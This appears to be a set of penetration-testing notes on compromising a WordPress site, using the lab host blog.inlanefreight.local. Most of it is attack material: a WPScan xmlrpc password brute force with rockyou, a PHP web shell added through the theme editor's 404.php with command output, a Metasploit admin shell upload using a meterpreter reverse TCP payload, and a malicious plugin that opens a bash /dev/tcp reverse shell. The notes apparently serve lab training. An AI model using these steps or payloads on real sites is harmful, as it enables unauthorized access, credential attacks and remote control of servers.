### Enumeration

Using CURL:

```bash
curl -s http://blog.inlanefreight.local/robots.txt
curl -s http://blog.inlanefreight.local | grep WordPress
curl -s http://blog.inlanefreight.local/ | grep themes
curl -s http://blog.inlanefreight.local/ | grep plugins
```

WPScan:

```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>

wpscan --url http://blog.inlanefreight.local --enumerate u,ap,at,cb,dbe --plugins-detection aggressive
```
### Attack

Login Bruteforce:

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

Code Execution:

Edit existing page `Appearance -> Theme Editor` - select the appropriate theme, then select a php page e.g. `404.php`. Add this:

```bash
system($_GET[cmd]);
```

![[Pasted image 20250131151227.png]]

Now have code execution:

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Metasploit:

```bash
use exploit/unix/webapp/wp_admin_shell_upload
```

Add the details:

```bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.15.6     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress
```
### Custom Plugin

Create payload:

```bash
<?php

/**
* Plugin Name: Wordpress  Reverse Shell
* Author: NAME
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/x.x.x.x/xxxx 0>&1'")
?>
```

Zip it up:

```bash
zip shell.zip shell.php
```

Then upload it - Click `Plugins -> Add New -> Upload Plugin -> select zip file -> Install Now` then `Active Plugin`.

### Vulnerable Plugins

Look at ExploitDB, or google to find suitable exploits.